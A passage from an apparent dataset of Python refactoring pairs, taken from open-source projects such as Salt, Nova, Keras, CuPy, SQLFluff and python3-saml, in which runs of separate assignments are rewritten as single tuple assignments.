                        tag=""/salt/minion/minion_beacon_reset_complete"",
                        wait=kwargs.get(""timeout"", default_event_wait),
                    )
                    if event_ret and event_ret[""complete""]:
                        ret[""result""] = True
                        ret[""comment""] = ""Beacon configuration reset.""
                    else:
                        ret[""result""] = False
                        if ret is not None:
                            ret[""comment""] = event_ret[""comment""]
                        else:
                            ret[""comment""] = (
                                ""Did not receive the beacon reset event before the""
                                "" timeout of {}s"".format(
                                    kwargs.get(""timeout"", default_event_wait)
                                )
                            )
                    return ret
        except KeyError:
            # Effectively a no-op, since we can't really return without an event system
            ret[""result""] = False
            ret[""comment""] = ""Event module not available. Beacon reset job failed.""
    return ret","ret['result'] = False
ret['comment'] = 'Event module not available. Beacon reset job failed.'","ret['result'] , ret['comment']  = False, 'Event module not available. Beacon reset job failed.'"
salt,https://github.com/saltstack/salt/tree/master/salt/modules/beacons.py,,reset$744,"def reset(**kwargs):
    """"""
    Reset beacon configuration on the minion

    CLI Example:

    .. code-block:: bash

        salt '*' beacons.reset
    """"""

    ret = {""comment"": [], ""result"": True}

    if kwargs.get(""test""):
        ret[""comment""] = ""Beacons would be reset.""
    else:
        try:
            with salt.utils.event.get_event(
                ""minion"", opts=__opts__, listen=True
            ) as event_bus:
                res = __salt__[""event.fire""]({""func"": ""reset""}, ""manage_beacons"")
                if res:
                    event_ret = event_bus.get_event(
                        tag=""/salt/minion/minion_beacon_reset_complete"",
                        wait=kwargs.get(""timeout"", default_event_wait),
                    )
                    if event_ret and event_ret[""complete""]:
                        ret[""result""] = True
                        ret[""comment""] = ""Beacon configuration reset.""
                    else:
                        ret[""result""] = False
                        if ret is not None:
                            ret[""comment""] = event_ret[""comment""]
                        else:
                            ret[""comment""] = (
                                ""Did not receive the beacon reset event before the""
                                "" timeout of {}s"".format(
                                    kwargs.get(""timeout"", default_event_wait)
                                )
                            )
                    return ret
        except KeyError:
            # Effectively a no-op, since we can't really return without an event system
            ret[""result""] = False
            ret[""comment""] = ""Event module not available. Beacon reset job failed.""
    return ret","ret['result'] = True
ret['comment'] = 'Beacon configuration reset.'","ret['result'] , ret['comment']  = True, 'Beacon configuration reset.'"
nova,https://github.com/openstack/nova/tree/master/nova/compute/rpcapi.py,ComputeAPI,finish_revert_resize$703,"def finish_revert_resize(self, ctxt, instance, migration, host,
                             request_spec):
        msg_args = {
            'instance': instance,
            'migration': migration,
            'request_spec': request_spec,
        }

        client = self.router.client(ctxt)
        version = self._ver(ctxt, '5.2')

        if not client.can_send_version(version):
            msg_args.pop('request_spec')
            version = '5.0'

        cctxt = client.prepare(
                server=host, version=version)
        cctxt.cast(ctxt, 'finish_revert_resize', **msg_args)","msg_args = {'instance': instance, 'migration': migration, 'request_spec': request_spec}
client = self.router.client(ctxt)
version = self._ver(ctxt, '5.2')","msg_args , client , version  = {'instance': instance, 'migration': migration, 'request_spec': request_spec}, self.router.client(ctxt), self._ver(ctxt, '5.2')"
keras,https://github.com/keras-team/keras/tree/master/keras/distribute/multi_worker_testing_utils.py,,mnist_synthetic_dataset$39,"def mnist_synthetic_dataset(batch_size, steps_per_epoch):
  """"""Generate synthetic MNIST dataset for testing.""""""
  # train dataset
  x_train = tf.ones([batch_size * steps_per_epoch, 28, 28, 1],
                           dtype=tf.float32)
  y_train = tf.ones([batch_size * steps_per_epoch, 1],
                           dtype=tf.int32)
  train_ds = tf.data.Dataset.from_tensor_slices((x_train, y_train))
  train_ds = train_ds.repeat()
  # train_ds = train_ds.shuffle(100)
  train_ds = train_ds.batch(64, drop_remainder=True)

  # eval dataset
  x_test = tf.random.uniform([10000, 28, 28, 1], dtype=tf.float32)
  y_test = tf.random.uniform([10000, 1],
                                     minval=0,
                                     maxval=9,
                                     dtype=tf.int32)
  eval_ds = tf.data.Dataset.from_tensor_slices((x_test, y_test))
  eval_ds = eval_ds.batch(64, drop_remainder=True)

  return train_ds, eval_ds","x_train = tf.ones([batch_size * steps_per_epoch, 28, 28, 1], dtype=tf.float32)
y_train = tf.ones([batch_size * steps_per_epoch, 1], dtype=tf.int32)","x_train , y_train  = tf.ones([batch_size * steps_per_epoch, 28, 28, 1], dtype=tf.float32), tf.ones([batch_size * steps_per_epoch, 1], dtype=tf.int32)"
keras,https://github.com/keras-team/keras/tree/master/keras/distribute/multi_worker_testing_utils.py,,mnist_synthetic_dataset$39,"def mnist_synthetic_dataset(batch_size, steps_per_epoch):
  """"""Generate synthetic MNIST dataset for testing.""""""
  # train dataset
  x_train = tf.ones([batch_size * steps_per_epoch, 28, 28, 1],
                           dtype=tf.float32)
  y_train = tf.ones([batch_size * steps_per_epoch, 1],
                           dtype=tf.int32)
  train_ds = tf.data.Dataset.from_tensor_slices((x_train, y_train))
  train_ds = train_ds.repeat()
  # train_ds = train_ds.shuffle(100)
  train_ds = train_ds.batch(64, drop_remainder=True)

  # eval dataset
  x_test = tf.random.uniform([10000, 28, 28, 1], dtype=tf.float32)
  y_test = tf.random.uniform([10000, 1],
                                     minval=0,
                                     maxval=9,
                                     dtype=tf.int32)
  eval_ds = tf.data.Dataset.from_tensor_slices((x_test, y_test))
  eval_ds = eval_ds.batch(64, drop_remainder=True)

  return train_ds, eval_ds","train_ds = train_ds.batch(64, drop_remainder=True)
x_test = tf.random.uniform([10000, 28, 28, 1], dtype=tf.float32)
y_test = tf.random.uniform([10000, 1], minval=0, maxval=9, dtype=tf.int32)","train_ds , x_test , y_test  = train_ds.batch(64, drop_remainder=True), tf.random.uniform([10000, 28, 28, 1], dtype=tf.float32), tf.random.uniform([10000, 1], minval=0, maxval=9, dtype=tf.int32)"
cupy,https://github.com/cupy/cupy/tree/master/tests/cupy_tests/statistics_tests/test_histogram.py,TestCubHistogram,test_histogram_with_bins$370,"def test_histogram_with_bins(self, xp, dtype_a, dtype_b):
        x = testing.shaped_arange((10,), xp, dtype_a)
        bins = testing.shaped_arange((4,), xp, dtype_b)

        if xp is numpy:
            return xp.histogram(x, bins)[0]

        # xp is cupy, first ensure we really use CUB
        cub_func = 'cupy._statistics.histogram.cub.device_histogram'
        with testing.AssertFunctionIsCalled(cub_func):
            xp.histogram(x, bins)
        # ...then perform the actual computation
        return xp.histogram(x, bins)[0]","x = testing.shaped_arange((10,), xp, dtype_a)
bins = testing.shaped_arange((4,), xp, dtype_b)","x , bins  = testing.shaped_arange((10,), xp, dtype_a), testing.shaped_arange((4,), xp, dtype_b)"
nova,https://github.com/openstack/nova/tree/master/nova/tests/unit/api/openstack/compute/test_security_groups.py,TestSecurityGroupsV21,test_delete_security_group_in_use$630,"def test_delete_security_group_in_use(self, refresh_info_cache_mock):
        sg = self._create_sg_template().get('security_group')
        self._create_network()
        db_inst = fakes.stub_instance(id=1, nw_cache=[], security_groups=[])
        _context = context_maker.get_admin_context()
        instance = instance_obj.Instance._from_db_object(
            _context, instance_obj.Instance(), db_inst,
            expected_attrs=instance_obj.INSTANCE_DEFAULT_FIELDS)
        neutron = neutron_api.API()
        with mock.patch.object(nova.db.main.api, 'instance_get_by_uuid',
                               return_value=db_inst):
            neutron.allocate_for_instance(_context, instance, None,
                                          security_groups=[sg['id']])

        req = fakes.HTTPRequest.blank(
                '/v2/%s/os-security-groups/%s'
                % (fakes.FAKE_PROJECT_ID, sg['id']))
        self.assertRaises(webob.exc.HTTPBadRequest, self.controller.delete,
                          req, sg['id'])","db_inst = fakes.stub_instance(id=1, nw_cache=[], security_groups=[])
_context = context_maker.get_admin_context()","db_inst , _context  = fakes.stub_instance(id=1, nw_cache=[], security_groups=[]), context_maker.get_admin_context()"
nova,https://github.com/openstack/nova/tree/master/nova/tests/unit/api/openstack/compute/test_security_groups.py,TestSecurityGroupsV21,test_delete_security_group_in_use$630,"def test_delete_security_group_in_use(self, refresh_info_cache_mock):
        sg = self._create_sg_template().get('security_group')
        self._create_network()
        db_inst = fakes.stub_instance(id=1, nw_cache=[], security_groups=[])
        _context = context_maker.get_admin_context()
        instance = instance_obj.Instance._from_db_object(
            _context, instance_obj.Instance(), db_inst,
            expected_attrs=instance_obj.INSTANCE_DEFAULT_FIELDS)
        neutron = neutron_api.API()
        with mock.patch.object(nova.db.main.api, 'instance_get_by_uuid',
                               return_value=db_inst):
            neutron.allocate_for_instance(_context, instance, None,
                                          security_groups=[sg['id']])

        req = fakes.HTTPRequest.blank(
                '/v2/%s/os-security-groups/%s'
                % (fakes.FAKE_PROJECT_ID, sg['id']))
        self.assertRaises(webob.exc.HTTPBadRequest, self.controller.delete,
                          req, sg['id'])","instance = instance_obj.Instance._from_db_object(_context, instance_obj.Instance(), db_inst, expected_attrs=instance_obj.INSTANCE_DEFAULT_FIELDS)
neutron = neutron_api.API()","instance , neutron  = instance_obj.Instance._from_db_object(_context, instance_obj.Instance(), db_inst, expected_attrs=instance_obj.INSTANCE_DEFAULT_FIELDS), neutron_api.API()"
sqlfluff,https://github.com/sqlfluff/sqlfluff/tree/master/src/sqlfluff/rules/L036.py,Rule_L036,_get_indexes$75,"def _get_indexes(context: RuleContext):
        select_idx = -1
        first_new_line_idx = -1
        first_select_target_idx = -1
        first_whitespace_idx = -1
        select_targets = []
        from_segment = next(
            (seg for seg in context.siblings_post if seg.is_type(""from_clause"")),
            None,
        )
        pre_from_whitespace = []

        for fname_idx, seg in enumerate(context.segment.segments):
            if seg.is_type(""select_clause_element""):
                select_targets.append(seg)
                if first_select_target_idx == -1:
                    first_select_target_idx = fname_idx
            if seg.is_type(""keyword"") and seg.name == ""select"" and select_idx == -1:
                select_idx = fname_idx
            if seg.is_type(""newline"") and first_new_line_idx == -1:
                first_new_line_idx = fname_idx
            # TRICKY: Ignore whitespace prior to the first newline, e.g. if
            # the line with ""SELECT"" (before any select targets) has trailing
            # whitespace.
            if (
                seg.is_type(""whitespace"")
                and first_new_line_idx != -1
                and first_whitespace_idx == -1
            ):
                first_whitespace_idx = fname_idx

        for seg in context.siblings_post:
            if seg is from_segment:
                break

            if seg.is_type(""whitespace""):
                pre_from_whitespace.append(seg)

        return SelectTargetsInfo(
            select_idx,
            first_new_line_idx,
            first_select_target_idx,
            first_whitespace_idx,
            select_targets,
            from_segment,
            pre_from_whitespace,
        )","select_idx = -1
first_new_line_idx = -1
first_select_target_idx = -1
first_whitespace_idx = -1
select_targets = []
from_segment = next((seg for seg in context.siblings_post if seg.is_type('from_clause')), None)
pre_from_whitespace = []","select_idx , first_new_line_idx , first_select_target_idx , first_whitespace_idx , select_targets , from_segment , pre_from_whitespace  = -1, -1, -1, -1, [], next((seg for seg in context.siblings_post if seg.is_type('from_clause')), None), []"
python3-saml,https://github.com/onelogin/python3-saml/tree/master/tests/src/OneLogin/saml2_tests/idp_metadata_parser_test.py,OneLogin_Saml2_IdPMetadataParser_Test,test_parse_multi_singing_certs$360,"def test_parse_multi_singing_certs(self):
        """"""
        Tests the parse method of the OneLogin_Saml2_IdPMetadataParser
        Case: IdP metadata contains multiple signing certs and no encryption certs
        """"""
        xml_idp_metadata = self.file_contents(join(self.data_path, 'metadata', 'idp_metadata_multi_signing_certs.xml'))
        data = OneLogin_Saml2_IdPMetadataParser.parse(xml_idp_metadata)

        expected_settings_json = """"""
        {
            ""sp"": {
                ""NameIDFormat"": ""urn:oasis:names:tc:SAML:2.0:nameid-format:transient""
            },
            ""idp"": {
                ""singleLogoutService"": {
                    ""url"": ""https://idp.examle.com/saml/slo"",
                    ""binding"": ""urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect""
                },
                ""x509certMulti"": {
                    ""signing"": [
                        ""MIIEZTCCA02gAwIBAgIUPyy/A3bZAZ4m28PzEUUoT7RJhxIwDQYJKoZIhvcNAQEFBQAwcjELMAkGA1UEBhMCVVMxKzApBgNVBAoMIk9uZUxvZ2luIFRlc3QgKHNnYXJjaWEtdXMtcHJlcHJvZCkxFTATBgNVBAsMDE9uZUxvZ2luIElkUDEfMB0GA1UEAwwWT25lTG9naW4gQWNjb3VudCA4OTE0NjAeFw0xNjA4MDQyMjI5MzdaFw0yMTA4MDUyMjI5MzdaMHIxCzAJBgNVBAYTAlVTMSswKQYDVQQKDCJPbmVMb2dpbiBUZXN0IChzZ2FyY2lhLXVzLXByZXByb2QpMRUwEwYDVQQLDAxPbmVMb2dpbiBJZFAxHzAdBgNVBAMMFk9uZUxvZ2luIEFjY291bnQgODkxNDYwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDN6iqQGcLOCglNO42I2rkzE05UXSiMXT6c8ALThMMiaDw6qqzo3sd/tKK+NcNKWLIIC8TozWVyh5ykUiVZps+08xil7VsTU7E+wKu3kvmOsvw2wlRwtnoKZJwYhnr+RkBa+h1r3ZYUgXm1ZPeHMKj1g18KaWz9+MxYL6BhKqrOzfW/P2xxVRcFH7/pq+ZsDdgNzD2GD+apzY4MZyZj/N6BpBWJ0GlFsmtBegpbX3LBitJuFkk5L4/U/jjF1AJa3boBdCUVfATqO5G03H4XS1GySjBIRQXmlUF52rLjg6xCgWJ30/+t1X+IHLJeixiQ0vxyh6C4/usCEt94cgD1r8ADAgMBAAGjgfIwge8wDAYDVR0TAQH/BAIwADAdBgNVHQ4EFgQUPW0DcH0G3IwynWgi74co4wZ6n7gwga8GA1UdIwSBpzCBpIAUPW0DcH0G3IwynWgi74co4wZ6n7ihdqR0MHIxCzAJBgNVBAYTAlVTMSswKQYDVQQKDCJPbmVMb2dpbiBUZXN0IChzZ2FyY2lhLXVzLXByZXByb2QpMRUwEwYDVQQLDAxPbmVMb2dpbiBJZFAxHzAdBgNVBAMMFk9uZUxvZ2luIEFjY291bnQgODkxNDaCFD8svwN22QGeJtvD8xFFKE+0SYcSMA4GA1UdDwEB/wQEAwIHgDANBgkqhkiG9w0BAQUFAAOCAQEAQhB4q9jrycwbHrDSoYR1X4LFFzvJ9Us75wQquRHXpdyS9D6HUBXMGI6ahPicXCQrfLgN8vzMIiqZqfySXXv/8/dxe/X4UsWLYKYJHDJmxXD5EmWTa65chjkeP1oJAc8f3CKCpcP2lOBTthbnk2fEVAeLHR4xNdQO0VvGXWO9BliYPpkYqUIBvlm+Fg9mF7AM/Uagq2503XXIE1Lq//HON68P10vNMwLSKOtYLsoTiCnuIKGJqG37MsZVjQ1ZPRcO+LSLkq0i91gFxrOrVCrgztX4JQi5XkvEsYZGIXXjwHqxTVyt3adZWQO0LPxPqRiUqUzyhDhLo/xXNrHCu4VbMw=="",
                        ""MIICZDCCAc2gAwIBAgIBADANBgkqhkiG9w0BAQ0FADBPMQswCQYDVQQGEwJ1czEUMBIGA1UECAwLZXhhbXBsZS5jb20xFDASBgNVBAoMC2V4YW1wbGUuY29tMRQwEgYDVQQDDAtleGFtcGxlLmNvbTAeFw0xNzA0MTUxNjMzMThaFw0xODA0MTUxNjMzMThaME8xCzAJBgNVBAYTAnVzMRQwEgYDVQQIDAtleGFtcGxlLmNvbTEUMBIGA1UECgwLZXhhbXBsZS5jb20xFDASBgNVBAMMC2V4YW1wbGUuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC6GLkl5lDUZdHNDAojp5i24OoPlqrt5TGXJIPqAZYT1hQvJW5nv17MFDHrjmtEnmW4ACKEy0fAX80QWIcHunZSkbEGHb+NG/6oTi5RipXMvmHnfFnPJJ0AdtiLiPE478CV856gXekV4Xx5u3KrylcOgkpYsp0GMIQBDzleMUXlYQIDAQABo1AwTjAdBgNVHQ4EFgQUnP8vlYPGPL2n6ZzDYij2kMDC8wMwHwYDVR0jBBgwFoAUnP8vlYPGPL2n6ZzDYij2kMDC8wMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQ0FAAOBgQAlQGAl+b8Cpot1g+65lLLjVoY7APJPWLW0klKQNlMU0s4MU+71Y3ExUEOXDAZgKcFoavb1fEOGMwEf38NaJAy1e/l6VNuixXShffq20ymqHQxOG0q8ujeNkgZF9k6XDfn/QZ3AD0o/IrCT7UMc/0QsfgIjWYxwCvp2syApc5CYfQ=="",
                        ""MIIEZTCCA02gAwIBAgIUPyy/A3bZAZ4m28PzEUUoT7RJhxIwDQYJKoZIhvcNAQEFBQAwcjELMAkGA1UEBhMCVVMxKzApBgNVBAoMIk9uZUxvZ2luIFRlc3QgKHNnYXJjaWEtdXMtcHJlcHJvZCkxFTATBgNVBAsMDE9uZUxvZ2luIElkUDEfMB0GA1UEAwwWT25lTG9naW4gQWNjb3VudCA4OTE0NjAeFw0xNjA4MDQyMjI5MzdaFw0yMTA4MDUyMjI5MzdaMHIxCzAJBgNVBAYTAlVTMSswKQYDVQQKDCJPbmVMb2dpbiBUZXN0IChzZ2FyY2lhLXVzLXByZXByb2QpMRUwEwYDVQQLDAxPbmVMb2dpbiBJZFAxHzAdBgNVBAMMFk9uZUxvZ2luIEFjY291bnQgODkxNDYwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDN6iqQGcLOCglNO42I2rkzE05UXSiMXT6c8ALThMMiaDw6qqzo3sd/tKK+NcNKWLIIC8TozWVyh5ykUiVZps+08xil7VsTU7E+wKu3kvmOsvw2wlRwtnoKZJwYhnr+RkBa+h1r3ZYUgXm1ZPeHMKj1g18KaWz9+MxYL6BhKqrOzfW/P2xxVRcFH7/pq+ZsDdgNzD2GD+apzY4MZyZj/N6BpBWJ0GlFsmtBegpbX3LBitJuFkk5L4/U/jjF1AJa3boBdCUVfATqO5G03H4XS1GySjBIRQXmlUF52rLjg6xCgWJ30/+t1X+IHLJeixiQ0vxyh6C4/usCEt94cgD1r8ADAgMBAAGjgfIwge8wDAYDVR0TAQH/BAIwADAdBgNVHQ4EFgQUPW0DcH0G3IwynWgi74co4wZ6n7gwga8GA1UdIwSBpzCBpIAUPW0DcH0G3IwynWgi74co4wZ6n7ihdqR0MHIxCzAJBgNVBAYTAlVTMSswKQYDVQQKDCJPbmVMb2dpbiBUZXN0IChzZ2FyY2lhLXVzLXByZXByb2QpMRUwEwYDVQQLDAxPbmVMb2dpbiBJZFAxHzAdBgNVBAMMFk9uZUxvZ2luIEFjY291bnQgODkxNDaCFD8svwN22QGeJtvD8xFFKE+0SYcSMA4GA1UdDwEB/wQEAwIHgDANBgkqhkiG9w0BAQUFAAOCAQEAQhB4q9jrycwbHrDSoYR1X4LFFzvJ9Us75wQquRHXpdyS9D6HUBXMGI6ahPicXCQrfLgN8vzMIiqZqfySXXv/8/dxe/X4UsWLYKYJHDJmxXD5EmWTa65chjkeP1oJAc8f3CKCpcP2lOBTthbnk2fEVAeLHR4xNdQO0VvGXWO9BliYPpkYqUIBvlm+Fg9mF7AM/Uagq2503XXIE1Lq//HON68P10vNMwLSKOtYLsoTiCnuIKGJqG37MsZVjQ1ZPRcO+LSLkq0i91gFxrOrVCrgztX4JQi5XkvEsYZGIXXjwHqxTVyt3adZWQO0LPxPqRiUqUzyhDhLo/xXNrHCu4VbMw==""
                    ]
                },
                ""entityId"": ""https://idp.examle.com/saml/metadata"",
                ""singleSignOnService"": {
                    ""url"": ""https://idp.examle.com/saml/sso"",
                    ""binding"": ""urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect""
                }
            }
        }
        """"""
        expected_settings = json.loads(expected_settings_json)
        self.assertEqual(expected_settings, data)","data = OneLogin_Saml2_IdPMetadataParser.parse(xml_idp_metadata)
expected_settings_json = '\n        {\n            ""sp"": {\n                ""NameIDFormat"": ""urn:oasis:names:tc:SAML:2.0:nameid-format:transient""\n            },\n            ""idp"": {\n                ""singleLogoutService"": {\n                    ""url"": ""https://idp.examle.com/saml/slo"",\n                    ""binding"": ""urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect""\n                },\n                ""x509certMulti"": {\n                    ""signing"": [\n                        ""MIIEZTCCA02gAwIBAgIUPyy/A3bZAZ4m28PzEUUoT7RJhxIwDQYJKoZIhvcNAQEFBQAwcjELMAkGA1UEBhMCVVMxKzApBgNVBAoMIk9uZUxvZ2luIFRlc3QgKHNnYXJjaWEtdXMtcHJlcHJvZCkxFTATBgNVBAsMDE9uZUxvZ2luIElkUDEfMB0GA1UEAwwWT25lTG9naW4gQWNjb3VudCA4OTE0NjAeFw0xNjA4MDQyMjI5MzdaFw0yMTA4MDUyMjI5MzdaMHIxCzAJBgNVBAYTAlVTMSswKQYDVQQKDCJPbmVMb2dpbiBUZXN0IChzZ2FyY2lhLXVzLXByZXByb2QpMRUwEwYDVQQLDAxPbmVMb2dpbiBJZFAxHzAdBgNVBAMMFk9uZUxvZ2luIEFjY291bnQgODkxNDYwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDN6iqQGcLOCglNO42I2rkzE05UXSiMXT6c8ALThMMiaDw6qqzo3sd/tKK+NcNKWLIIC8TozWVyh5ykUiVZps+08xil7VsTU7E+wKu3kvmOsvw2wlRwtnoKZJwYhnr+RkBa+h1r3ZYUgXm1ZPeHMKj1g18KaWz9+MxYL6BhKqrOzfW/P2xxVRcFH7/pq+ZsDdgNzD2GD+apzY4MZyZj/N6BpBWJ0GlFsmtBegpbX3LBitJuFkk5L4/U/jjF1AJa3boBdCUVfATqO5G03H4XS1GySjBIRQXmlUF52rLjg6xCgWJ30/+t1X+IHLJeixiQ0vxyh6C4/usCEt94cgD1r8ADAgMBAAGjgfIwge8wDAYDVR0TAQH/BAIwADAdBgNVHQ4EFgQUPW0DcH0G3IwynWgi74co4wZ6n7gwga8GA1UdIwSBpzCBpIAUPW0DcH0G3IwynWgi74co4wZ6n7ihdqR0MHIxCzAJBgNVBAYTAlVTMSswKQYDVQQKDCJPbmVMb2dpbiBUZXN0IChzZ2FyY2lhLXVzLXByZXByb2QpMRUwEwYDVQQLDAxPbmVMb2dpbiBJZFAxHzAdBgNVBAMMFk9uZUxvZ2luIEFjY291bnQgODkxNDaCFD8svwN22QGeJtvD8xFFKE+0SYcSMA4GA1UdDwEB/wQEAwIHgDANBgkqhkiG9w0BAQUFAAOCAQEAQhB4q9jrycwbHrDSoYR1X4LFFzvJ9Us75wQquRHXpdyS9D6HUBXMGI6ahPicXCQrfLgN8vzMIiqZqfySXXv/8/dxe/X4UsWLYKYJHDJmxXD5EmWTa65chjkeP1oJAc8f3CKCpcP2lOBTthbnk2fEVAeLHR4xNdQO0VvGXWO9BliYPpkYqUIBvlm+Fg9mF7AM/Uagq2503XXIE1Lq//HON68P10vNMwLSKOtYLsoTiCnuIKGJqG37MsZVjQ1ZPRcO+LSLkq0i91gFxrOrVCrgztX4JQi5XkvEsYZGIXXjwHqxTVyt3adZWQO0LPxPqRiUqUzyhDhLo/xXNrHCu4VbMw=="",\n                        ""MIICZDCCAc2gAwIBAgIBADANBgkqhkiG9w0BAQ0FADBPMQswCQYDVQQGEwJ1czEUMBIGA1UECAwLZXhhbXBsZS5jb20xFDASBgNVBAoMC2V4YW1wbGUuY29tMRQwEgYDVQQDDAtleGFtcGxlLmNvbTAeFw0xNzA0MTUxNjMzMThaFw0xODA0MTUxNjMzMThaME8xCzAJBgNVBAYTAnVzMRQwEgYDVQQIDAtleGFtcGxlLmNvbTEUMBIGA1UECgwLZXhhbXBsZS5jb20xFDASBgNVBAMMC2V4YW1wbGUuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC6GLkl5lDUZdHNDAojp5i24OoPlqrt5TGXJIPqAZYT1hQvJW5nv17MFDHrjmtEnmW4ACKEy0fAX80QWIcHunZSkbEGHb+NG/6oTi5RipXMvmHnfFnPJJ0AdtiLiPE478CV856gXekV4Xx5u3KrylcOgkpYsp0GMIQBDzleMUXlYQIDAQABo1AwTjAdBgNVHQ4EFgQUnP8vlYPGPL2n6ZzDYij2kMDC8wMwHwYDVR0jBBgwFoAUnP8vlYPGPL2n6ZzDYij2kMDC8wMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQ0FAAOBgQAlQGAl+b8Cpot1g+65lLLjVoY7APJPWLW0klKQNlMU0s4MU+71Y3ExUEOXDAZgKcFoavb1fEOGMwEf38NaJAy1e/l6VNuixXShffq20ymqHQxOG0q8ujeNkgZF9k6XDfn/QZ3AD0o/IrCT7UMc/0QsfgIjWYxwCvp2syApc5CYfQ=="",\n                        ""MIIEZTCCA02gAwIBAgIUPyy/A3bZAZ4m28PzEUUoT7RJhxIwDQYJKoZIhvcNAQEFBQAwcjELMAkGA1UEBhMCVVMxKzApBgNVBAoMIk9uZUxvZ2luIFRlc3QgKHNnYXJjaWEtdXMtcHJlcHJvZCkxFTATBgNVBAsMDE9uZUxvZ2luIElkUDEfMB0GA1UEAwwWT25lTG9naW4gQWNjb3VudCA4OTE0NjAeFw0xNjA4MDQyMjI5MzdaFw0yMTA4MDUyMjI5MzdaMHIxCzAJBgNVBAYTAlVTMSswKQYDVQQKDCJPbmVMb2dpbiBUZXN0IChzZ2FyY2lhLXVzLXByZXByb2QpMRUwEwYDVQQLDAxPbmVMb2dpbiBJZFAxHzAdBgNVBAMMFk9uZUxvZ2luIEFjY291bnQgODkxNDYwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDN6iqQGcLOCglNO42I2rkzE05UXSiMXT6c8ALThMMiaDw6qqzo3sd/tKK+NcNKWLIIC8TozWVyh5ykUiVZps+08xil7VsTU7E+wKu3kvmOsvw2wlRwtnoKZJwYhnr+RkBa+h1r3ZYUgXm1ZPeHMKj1g18KaWz9+MxYL6BhKqrOzfW/P2xxVRcFH7/pq+ZsDdgNzD2GD+apzY4MZyZj/N6BpBWJ0GlFsmtBegpbX3LBitJuFkk5L4/U/jjF1AJa3boBdCUVfATqO5G03H4XS1GySjBIRQXmlUF52rLjg6xCgWJ30/+t1X+IHLJeixiQ0vxyh6C4/usCEt94cgD1r8ADAgMBAAGjgfIwge8wDAYDVR0TAQH/BAIwADAdBgNVHQ4EFgQUPW0DcH0G3IwynWgi74co4wZ6n7gwga8GA1UdIwSBpzCBpIAUPW0DcH0G3IwynWgi74co4wZ6n7ihdqR0MHIxCzAJBgNVBAYTAlVTMSswKQYDVQQKDCJPbmVMb2dpbiBUZXN0IChzZ2FyY2lhLXVzLXByZXByb2QpMRUwEwYDVQQLDAxPbmVMb2dpbiBJZFAxHzAdBgNVBAMMFk9uZUxvZ2luIEFjY291bnQgODkxNDaCFD8svwN22QGeJtvD8xFFKE+0SYcSMA4GA1UdDwEB/wQEAwIHgDANBgkqhkiG9w0BAQUFAAOCAQEAQhB4q9jrycwbHrDSoYR1X4LFFzvJ9Us75wQquRHXpdyS9D6HUBXMGI6ahPicXCQrfLgN8vzMIiqZqfySXXv/8/dxe/X4UsWLYKYJHDJmxXD5EmWTa65chjkeP1oJAc8f3CKCpcP2lOBTthbnk2fEVAeLHR4xNdQO0VvGXWO9BliYPpkYqUIBvlm+Fg9mF7AM/Uagq2503XXIE1Lq//HON68P10vNMwLSKOtYLsoTiCnuIKGJqG37MsZVjQ1ZPRcO+LSLkq0i91gFxrOrVCrgztX4JQi5XkvEsYZGIXXjwHqxTVyt3adZWQO0LPxPqRiUqUzyhDhLo/xXNrHCu4VbMw==""\n                    ]\n                },\n                ""entityId"": ""https://idp.examle.com/saml/metadata"",\n                ""singleSignOnService"": {\n                    ""url"": ""https://idp.examle.com/saml/sso"",\n                    ""binding"": ""urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect""\n                }\n            }\n        }\n        '","data , expected_settings_json  = OneLogin_Saml2_IdPMetadataParser.parse(xml_idp_metadata), '\n        {\n            ""sp"": {\n                ""NameIDFormat"": ""urn:oasis:names:tc:SAML:2.0:nameid-format:transient""\n            },\n            ""idp"": {\n                ""singleLogoutService"": {\n                    ""url"": ""https://idp.examle.com/saml/slo"",\n                    ""binding"": ""urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect""\n                },\n                ""x509certMulti"": {\n                    ""signing"": [\n                        ""MIIEZTCCA02gAwIBAgIUPyy/A3bZAZ4m28PzEUUoT7RJhxIwDQYJKoZIhvcNAQEFBQAwcjELMAkGA1UEBhMCVVMxKzApBgNVBAoMIk9uZUxvZ2luIFRlc3QgKHNnYXJjaWEtdXMtcHJlcHJvZCkxFTATBgNVBAsMDE9uZUxvZ2luIElkUDEfMB0GA1UEAwwWT25lTG9naW4gQWNjb3VudCA4OTE0NjAeFw0xNjA4MDQyMjI5MzdaFw0yMTA4MDUyMjI5MzdaMHIxCzAJBgNVBAYTAlVTMSswKQYDVQQKDCJPbmVMb2dpbiBUZXN0IChzZ2FyY2lhLXVzLXByZXByb2QpMRUwEwYDVQQLDAxPbmVMb2dpbiBJZFAxHzAdBgNVBAMMFk9uZUxvZ2luIEFjY291bnQgODkxNDYwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDN6iqQGcLOCglNO42I2rkzE05UXSiMXT6c8ALThMMiaDw6qqzo3sd/tKK+NcNKWLIIC8TozWVyh5ykUiVZps+08xil7VsTU7E+wKu3kvmOsvw2wlRwtnoKZJwYhnr+RkBa+h1r3ZYUgXm1ZPeHMKj1g18KaWz9+MxYL6BhKqrOzfW/P2xxVRcFH7/pq+ZsDdgNzD2GD+apzY4MZyZj/N6BpBWJ0GlFsmtBegpbX3LBitJuFkk5L4/U/jjF1AJa3boBdCUVfATqO5G03H4XS1GySjBIRQXmlUF52rLjg6xCgWJ30/+t1X+IHLJeixiQ0vxyh6C4/usCEt94cgD1r8ADAgMBAAGjgfIwge8wDAYDVR0TAQH/BAIwADAdBgNVHQ4EFgQUPW0DcH0G3IwynWgi74co4wZ6n7gwga8GA1UdIwSBpzCBpIAUPW0DcH0G3IwynWgi74co4wZ6n7ihdqR0MHIxCzAJBgNVBAYTAlVTMSswKQYDVQQKDCJPbmVMb2dpbiBUZXN0IChzZ2FyY2lhLXVzLXByZXByb2QpMRUwEwYDVQQLDAxPbmVMb2dpbiBJZFAxHzAdBgNVBAMMFk9uZUxvZ2lu